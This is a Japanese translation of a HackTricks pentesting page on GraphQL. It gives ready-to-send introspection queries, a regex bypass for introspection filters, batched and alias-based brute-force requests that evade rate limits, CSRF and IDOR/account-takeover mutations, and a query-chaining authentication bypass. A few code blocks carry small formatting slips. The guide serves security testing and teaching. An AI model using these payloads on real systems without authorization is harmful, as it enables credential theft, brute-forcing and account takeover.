# GraphQL

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

## はじめに

GraphQLはREST APIの代替として機能します。REST APIでは、クライアントがバックエンドデータベースからデータをクエリするために、APIの異なるエンドポイントに複数のリクエストを送信する必要があります。GraphQLを使用すると、バックエンドをクエリするために1つのリクエストのみを送信する必要があります。これは、APIに複数のリクエストを送信する必要がないため、はるかにシンプルです。単一のリクエストを使用して、必要なすべての情報を収集できます。

## GraphQL

新しい技術が登場すると、新しい脆弱性も現れます。**デフォルト**では、GraphQLは**認証**を**実装していません**。これは開発者が実装することになっています。つまり、デフォルトではGraphQLは誰でもクエリを許可し、機密情報が認証されていない攻撃者に利用可能になります。

ディレクトリブルートフォース攻撃を行うときは、GraphQLインスタンスをチェックするために以下のパスを追加してください。

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

<figure><img src="../../.gitbook/assets/image (6) (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

オープンなGraphQLインスタンスを見つけたら、**どのクエリをサポートしているか**を知る必要があります。これはイントロスペクションシステムを使用して行うことができ、詳細はこちらで見つけることができます：[**GraphQL: A query language for APIs.**\
GraphQLスキーマに、サポートしているクエリについての情報を尋ねることはしばしば役立ちます。GraphQLでは、そうすることができます…](https://graphql.org/learn/introspection/)

### 指紋

ツール[**graphw00f**](https://github.com/dolevf/graphw00f)は、サーバーで使用されているGraphQLエンジンを検出し、セキュリティ監査員に役立つ情報を表示することができます。

#### ユニバーサルクエリ <a href="#universal-queries" id="universal-queries"></a>

任意のGraphQLエンドポイントに`query{__typename}`を送信すると、その応答にはどこかに`{"data": {"__typename": "query"}}`という文字列が含まれます。これはユニバーサルクエリとして知られており、URLがGraphQLサービスに対応しているかどうかを探るのに役立つツールです。

このクエリは、すべてのGraphQLエンドポイントには`__typename`という予約されたフィールドがあり、クエリされたオブジェクトのタイプを文字列として返すために機能するからです。

### 基本的な列挙

GraphQLは通常、**GET**、**POST** (x-www-form-urlencoded)、**POST**(json)をサポートしています。ただし、CSRF攻撃を防ぐために、jsonのみを許可することがセキュリティ上推奨されています。

#### イントロスペクション

スキーマ情報を発見するためにイントロスペクションを使用するには、`__schema`フィールドをクエリします。このフィールドは、すべてのクエリのルートタイプで利用可能です。
```bash
query={__schema{types{name,fields{name}}}}
```
```graphql
{
  __schema {
    types {
      name
  }
}
```
{% endcode %}

このクエリを使用すると、使用されているすべてのタイプの名前がわかります。
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

このクエリを使用すると、すべてのタイプ、そのフィールド、およびその引数（および引数のタイプ）を抽出できます。これはデータベースにどのようにクエリを実行するかを知るために非常に役立ちます。

![](<../../.gitbook/assets/image (207) (3).png>)

**エラー**

**エラー**が**表示**されるかどうかを知ることは興味深いです。なぜなら、役立つ**情報**を提供するからです。
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (205) (1).png>)

**インロスペクションを通じてデータベーススキーマを列挙する**

{% hint style="info" %}
インロスペクションが有効になっているが、上記のクエリが実行されない場合は、クエリ構造から `onOperation`、`onFragment`、`onField` のディレクティブを削除してみてください。
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
インラインインロスペクションクエリ：
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
### クエリ

データベース内にどのような情報が保存されているかがわかったので、**いくつかの値を抽出**してみましょう。

イントロスペクションで、**直接クエリできるオブジェクト**を見つけることができます（存在するからといって、任意のオブジェクトをクエリできるわけではありません）。次の画像では、"_queryType_" が "_Query_" と呼ばれており、"_Query_" オブジェクトのフィールドの一つに "_flags_" があり、これもオブジェクトのタイプです。したがって、フラグオブジェクトをクエリできます。

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

クエリ "_flags_" のタイプが "_Flags_" であり、このオブジェクトは以下のように定義されています：

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

"_Flags_" オブジェクトは **name** と **value** で構成されていることがわかります。次のクエリでフラグのすべての名前と値を取得できます：
```javascript
query={flags{name, value}}
```
以下の例のように、**クエリするオブジェクト**が**プリミティブ** **タイプ**で、**文字列**の場合

![](<../../.gitbook/assets/image (441).png>)

次のようにクエリすることができます：
```javascript
query={hiddenFlags}
```
以下は、"_Query_" タイプオブジェクト内に2つのオブジェクトがある別の例です: "_user_" と "_users_"。これらのオブジェクトが検索に何の引数も必要としない場合、データを求めるだけで**すべての情報を取得できます**。インターネットからのこの例では、保存されたユーザー名とパスワードを抽出できます:

![](<../../.gitbook/assets/image (208).png>)

しかし、この例でそれを試みると、次のような**エラー**が発生します:

![](<../../.gitbook/assets/image (210).png>)

どうやら "_**uid**_" 引数を使って検索するようです。その型は _**Int**_ です。\
とはいえ、[基本列挙](graphql.md#basic-enumeration)セクションで、必要な情報をすべて表示するクエリが提案されていました: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

提供された画像を読むと、"_**user**_" が _Int_ 型の引数 "_**uid**_" を持っていることがわかります。

そこで、軽い _**uid**_ ブルートフォースを行ったところ、_**uid**=**1**_ でユーザー名とパスワードが取得されました:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

存在しないものを探そうとするとエラーが発生するため、"_**user**_" と "_**password**_" の**パラメーター**を求めることができることを**発見**しました（`query={user(uid:1){noExists}}`）:

![](<../../.gitbook/assets/image (213).png>)

そして、**列挙フェーズ**で、"_**dbuser**_" オブジェクトが "_**user**_" と "_**password**_" のフィールドを持っていることを発見しました。

**クエリ文字列ダンプのトリック（@BinaryShadow\_ に感謝）**

文字列型で検索できる場合、例えば `query={theusers(description: ""){username,password}}` で**空の文字列を検索する**と、**すべてのデータがダンプされます**。（_この例はチュートリアルの例とは関係ありません。この例では、"**theusers**" を "**description**" というStringフィールドを使って検索できると仮定しています_）。

GraphQLは比較的新しい技術で、スタートアップや大企業の間で徐々に注目を集めています。デフォルトで認証が欠けていること以外にも、GraphQLエンドポイントはIDORなどの他のバグにも脆弱である可能性があります。

### 検索

この例では、**名前**と**メールアドレス**で識別される**人物**と、**名前**と**評価**で識別される**映画**があるデータベースを想像してください。**人物**は他の**人物**と**友達**になることができ、人物は**映画を所有**することができます。

**名前**で人物を**検索**し、そのメールアドレスを取得できます:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
**名前**で人物を**検索**し、彼らが**登録している**映画を取得できます：
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
以下の方法で、その人の`subscribedMovies`の`name`を取得することが示されています。

また、**複数のオブジェクトを同時に検索する**こともできます。この場合、2つの映画に対する検索が行われます：
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
または、**エイリアスを使用した複数の異なるオブジェクトの関連付け**：
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### ミューテーション

**ミューテーションはサーバー側で変更を加えるために使用されます。**

**イントロスペクション**では、**宣言された** **ミューテーション**を見つけることができます。次の画像では、"_MutationType_" が "_Mutation_" と呼ばれ、"_Mutation_" オブジェクトにはミューテーションの名前が含まれています（この場合は "_addPerson_" のように）：

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

この例では、メールと名前で識別される**人物**と、名前と評価で識別される**映画**があるデータベースを想像してください。**人物**は他の**人物**と**友達**になることができ、人物は映画を**所有**することができます。

データベース内に新しい映画を**作成する**ミューテーションは、次のようになることがあります（この例ではミューテーションは `addMovie` と呼ばれています）：
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**クエリでは、値とデータの型がどのように示されているかに注目してください。**

また、友達とファイルを持つ**人物**を**作成**するための**変更**（この例では `addPerson` と呼ばれています）が存在するかもしれません（友達と映画は、それらに関連する人物を作成する前に存在している必要があります）：
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### 1つのAPIリクエストでのバッチングブルートフォース

この情報は[https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)から取得しました。\
**同時に多くのクエリを異なる認証情報と共に送信する**ことでGraphQL APIを通じた認証を行います。これは典型的なブルートフォース攻撃ですが、GraphQLのバッチ処理機能のおかげで、HTTPリクエストごとに1組のログイン/パスワードペアを超えて送信することが可能です。このアプローチは、外部のレートモニタリングアプリケーションをだまして、パスワードを推測しようとするブルートフォーシングボットが存在しないと思わせることができます。

以下に、**一度に3組の異なるメール/パスワードペア**を使用したアプリケーション認証リクエストの最も単純なデモンストレーションを示します。明らかに、同じ方法で1つのリクエストに数千を送信することも可能です：

![](<../../.gitbook/assets/image (182) (1).png>)

レスポンスのスクリーンショットからわかるように、最初と3番目のリクエストは_null_を返し、_error_セクションに対応する情報を反映しました。**2番目のミューテーションは正しい認証**データを持っており、レスポンスには正しい認証セッショントークンがあります。

![](<../../.gitbook/assets/image (119) (1).png>)

## イントロスペクションなしのGraphQL

ますます多くの**graphqlエンドポイントがイントロスペクションを無効にしています**。しかし、予期しないリクエストを受け取ったときにgraphqlが投げるエラーは、[**clairvoyance**](https://github.com/nikitastupin/clairvoyance)のようなツールがスキーマの大部分を再現するのに十分です。

さらに、Burp Suiteの拡張機能[**GraphQuail**](https://github.com/forcesunseen/graphquail)は**Burpを通過するGraphQL APIリクエストを観察し**、新しいクエリを見るたびに内部のGraphQL**スキーマ**を**構築**します。また、GraphiQLやVoyager用のスキーマを公開することもできます。拡張機能はイントロスペクションクエリを受け取ると偽のレスポンスを返します。その結果、GraphQuailはAPI内で使用可能なすべてのクエリ、引数、フィールドを表示します。詳細については[**こちらをチェックしてください**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema)。

[**GraphQLエンティティを発見するための素晴らしいワードリストはこちらで見つけることができます**](https://github.com/Escape-Technologies/graphql-wordlist?).

### GraphQLイントロスペクション防御をバイパスする <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

テストしているAPIでイントロスペクションクエリを実行できない場合は、`__schema`キーワードの後に**特殊文字を挿入してみてください**。

開発者がイントロスペクションを無効にするとき、クエリ内の`__schema`キーワードを除外するために正規表現を使用することがあります。**スペース**、**改行**、**コンマ**などの文字を試してみてください。これらはGraphQLによって**無視されます**が、不完全な正規表現では無視されません。

したがって、開発者が`__schema{`のみを除外している場合、以下のイントロスペクションクエリは除外されません。
```bash
#Introspection query with newline
{
"query": "query{__schema
{queryType{name}}}"
}
```
```
もしこれがうまくいかない場合は、別のリクエストメソッドでプローブを実行してみてください。なぜなら、イントロスペクションはPOST経由でのみ無効にされている可能性があります。GETリクエストを試すか、`x-www-form-urlencoded`のコンテントタイプを持つPOSTリクエストを試してください。

### 漏洩したGraphQLの構造

イントロスペクションが無効になっている場合は、ウェブサイトのソースコードを調べてみてください。クエリはしばしば、javascriptライブラリとしてブラウザに事前に読み込まれています。これらの事前に書かれたクエリは、各オブジェクトと関数のスキーマと使用についての貴重な情報を明らかにすることができます。開発者ツールの`Sources`タブは、クエリが保存されている場所を列挙するためにすべてのファイルを検索することができます。時には、管理者が保護しているクエリでさえ既に露出していることがあります。
```
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## GraphQLにおけるCSRF

CSRFが何かわからない場合は、以下のページを読んでください：

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

多くのGraphQLエンドポイントが**CSRFトークンなしで設定されている**ことがあります。

GraphQLのリクエストは通常、Content-Typeが**`application/json`**のPOSTリクエストを使用して送信されます。
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
しかし、ほとんどのGraphQLエンドポイントは**`form-urlencoded` POSTリクエスト:**もサポートしています。
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
したがって、前述のようなCSRFリクエストは**プリフライトリクエストなしで送信される**ため、CSRFを悪用してGraphQLで**変更を加える**ことが可能です。

ただし、Chromeの`samesite`フラグの新しいデフォルトクッキー値は`Lax`であることに注意してください。これは、サードパーティのウェブからGETリクエストでのみクッキーが送信されることを意味します。

通常、**クエリ** **リクエスト**も**GET** **リクエスト**として送信することが可能であり、GETリクエストではCSRFトークンが検証されない可能性があることに注意してください。

また、[**XS-Search**](../../pentesting-web/xs-search.md) **攻撃**を悪用することで、ユーザーの認証情報を悪用してGraphQLエンドポイントからコンテンツを抜き出すことが可能になるかもしれません。

詳細については、[**こちらのオリジナルポストをチェックしてください**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)。

## GraphQLにおける認可

エンドポイントで定義された多くのGraphQL機能は、リクエスターの認証のみをチェックし、認可はチェックしない場合があります。

クエリ入力変数を変更することで、機密アカウントの詳細が[漏洩](https://hackerone.com/reports/792927)する可能性があります。

ミューテーションは、他のアカウントデータを変更しようとすることで、アカウントの乗っ取りにさえつながる可能性があります。
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### GraphQLにおける認証のバイパス

[クエリのチェーン](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln)を組み合わせることで、弱い認証システムをバイパスできます。

以下の例では、操作が「forgotPassword」であり、それに関連するforgotPasswordクエリのみを実行するべきです。これは、最後にクエリを追加することでバイパスできます。この場合、「register」と新しいユーザーとしてシステムに登録するためのユーザー変数を追加します。

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## エイリアスを使用したレートリミットのバイパス

通常、GraphQLオブジェクトは同じ名前の複数のプロパティを含むことはできません。エイリアスを使用すると、APIに返してほしい**プロパティを明示的に命名することで**、この制限をバイパスできます。エイリアスを使用して、一つのリクエストで同じタイプのオブジェクトの**複数のインスタンスを返す**ことができます。

GraphQLエイリアスの詳細については、[エイリアス](https://portswigger.net/web-security/graphql/what-is-graphql#aliases)を参照してください。

エイリアスはAPIコールの数を減らすことを目的としていますが、GraphQLエンドポイントをブルートフォースするためにも使用できます。

多くのエンドポイントには、ブルートフォース攻撃を防ぐための何らかの**レートリミッターが設置されています**。一部のレートリミッターは、エンドポイントで実行された操作の数ではなく、受信した**HTTPリクエストの数に基づいて**機能します。エイリアスを使用すると、複数のクエリを単一のHTTPメッセージで送信できるため、この制限をバイパスできます。

以下の簡略化された例は、**エイリアス付きのクエリが店舗の割引コードが有効かどうかをチェックしている**ことを示しています。これは単一のHTTPリクエストであるため、レートリミットをバイパスする可能性がありますが、一度に大量の割引コードをチェックするために使用される可能性があります。
```bash
#Request with aliased queries
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## ツール

### 脆弱性スキャナー

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): スキーマの取得や機密データの検索、認証のテスト、スキーマのブルートフォース、特定のタイプへのパスの検出に使用できるツールキット。
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): スタンドアロンまたは[Burp extension](https://github.com/doyensec/inql)として使用可能。
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): CLIクライアントとしても使用可能で、攻撃の自動化が可能。
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): GraphQLスキーマ内で特定のタイプに到達するさまざまな方法をリストするツール。
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): GraphQLの高度なテストのためのBurp拡張機能。_**Scanner**_ はInQL v5.0の中核であり、GraphQLエンドポイントまたはローカルの内省スキーマファイルを分析できます。可能なすべてのクエリとミューテーションを自動生成し、分析のために構造化されたビューに整理します。_**Attacker**_ コンポーネントを使用すると、不十分に実装されたレート制限を回避するのに役立つバッチGraphQL攻撃を実行できます。

### クライアント

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUIクライアント
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUIクライアント

### 自動テスト

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* AutoGraphQLについての説明動画: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## 参考文献

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksに広告を掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>
